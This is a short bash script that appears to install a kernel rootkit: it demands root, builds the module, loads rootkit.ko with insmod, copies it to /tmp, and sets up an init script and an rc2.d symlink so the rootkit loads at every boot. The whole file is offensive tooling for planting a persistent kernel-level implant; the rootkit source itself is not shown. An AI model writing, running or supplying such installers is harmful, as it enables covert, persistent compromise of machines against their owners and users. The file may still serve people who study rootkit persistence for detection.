#!/bin/bash

RET=0

if [[ $UID != 0 ]]; then
    echo "Please run this script with sudo"
    exit 1
fi

make

if [ $? -eq 0 ]; then
    insmod ./rootkit.ko
    cp rootkit.ko /tmp/rootkit.ko
    cp init.sh /etc/init.d/rootkit
    ln -s /etc/init.d/rootkit /etc/rc2.d/S01rootkit
else
    echo "make failed"
    RET=1
fi

exit $RET
